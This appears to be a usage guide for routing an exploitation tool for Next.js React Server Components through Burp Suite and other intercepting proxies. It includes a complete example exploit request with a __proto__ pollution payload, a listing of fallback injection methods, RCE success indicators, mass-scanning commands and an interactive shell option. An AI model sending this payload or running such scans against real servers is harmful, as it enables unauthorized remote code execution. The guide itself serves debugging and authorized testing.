# Using RSC Hunter with Burp Suite

This guide shows how to inspect RSC Hunter's traffic using Burp Suite for debugging and analysis.

## Quick Setup

### 1. Start Burp Suite
- Open Burp Suite
- Go to **Proxy** → **Options**
- Verify listener is running on `127.0.0.1:8080` (default)

### 2. Run RSC Hunter with Proxy

**Single target scan:**
```bash
python3 rschunter.py --url https://example.com --proxy http://127.0.0.1:8080
```

**Mass scanning:**
```bash
python3 rschunter.py targets.txt --proxy http://127.0.0.1:8080
```

**With interactive shell:**
```bash
python3 rschunter.py --url https://vulnerable.com --proxy http://127.0.0.1:8080 -sh
```

**Using environment variable:**
```bash
export HTTP_PROXY=http://127.0.0.1:8080
python3 rschunter.py --url https://example.com
```

## What You'll See in Burp

### Detection Phase
1. **Initial GET requests** - Base URL testing
2. **RSC header probe** - `RSC: 1` header sent
3. **Endpoint enumeration** - Testing various Next.js paths
4. **Error-based detection** - Benign probe payloads

### Exploitation Phase
1. **Method 3 (Primary)** - POST to base URL with `__proto__` pollution
2. **Method 2 (Fallback)** - POST with `_chunks` field structure
3. **Method 1 (Last resort)** - Function constructor injection

### Example Request in Burp

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
RSC: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

------WebKitFormBoundary
Content-Disposition: form-data; name="0"

{"__proto__":{"next":{"data":{"env":{"INJECTION":"$((41*271))"}}}},"isServer":true}
------WebKitFormBoundary--
```

## Tips for Analysis

### Filter Traffic
In Burp's HTTP History, filter by:
- **Host**: Target domain
- **Status**: Look for 303 redirects (exploit success indicator)
- **Headers**: Search for `X-Action-Redirect` in responses

### Key Indicators
- **Vulnerable**: Response contains `X-Action-Redirect: s%3A11111` (RCE proof)
- **Exploited**: Digest contains command output hash
- **Protected**: WAF blocks or Vercel/Netlify mitigations active

### Debugging Failed Exploits
1. Check request payload format in Burp
2. Look for WAF blocks (403/418 status codes)
3. Verify Content-Type header is correct
4. Check for redirect chains
5. Inspect response headers for mitigation signatures

## Advanced Usage

### Custom Burp Port
```bash
python3 rschunter.py --url https://example.com --proxy http://127.0.0.1:9090
```

### Upstream Proxy Chain
```bash
# Route through Burp, then corporate proxy
python3 rschunter.py --url https://example.com --proxy http://127.0.0.1:8080
# Configure upstream proxy in Burp: User Options → Connections → Upstream Proxy Servers
```

### Save Burp State
1. In Burp, go to **Project** → **Project options** → **Misc**
2. Enable "Pause on exit"
3. Review all traffic after scan completes

## Troubleshooting

### SSL Certificate Errors
✅ **Already handled!** RSC Hunter automatically disables SSL verification when using proxy.

### No Traffic in Burp
- Verify Burp listener is running: **Proxy** → **Options**
- Check proxy URL is correct: `http://127.0.0.1:8080`
- Ensure no firewall blocking localhost connections

### Slow Scanning
- Normal when using proxy (each request goes through Burp)
- Reduce threads: `--threads 5`
- Disable Burp extensions temporarily
- Turn off "Intercept" mode in Burp

## mitmproxy Alternative

If you prefer mitmproxy over Burp:

```bash
# Start mitmproxy
mitmproxy -p 8080

# Run scanner
python3 rschunter.py --url https://example.com --proxy http://127.0.0.1:8080
```

## ZAP Alternative

For OWASP ZAP users:

```bash
# Default ZAP port is 8090
python3 rschunter.py --url https://example.com --proxy http://127.0.0.1:8090
```

## Security Notes

⚠️ **Important:**
- Only use proxy on targets you have permission to test
- Traffic inspection proxies see all data (including credentials if any)
- Disable SSL verification is automatic for MITM inspection
- Don't use proxy flags on production scans without understanding the implications

## Example Output

When proxy is enabled, you'll see:

```
Advanced Configuration:
  ✓ Proxy: http://127.0.0.1:8080 (SSL verification disabled)

Scanning Targets...
[*] Scanning: https://example.com
    → All traffic routed through Burp Suite
```

Happy hunting! 🎯
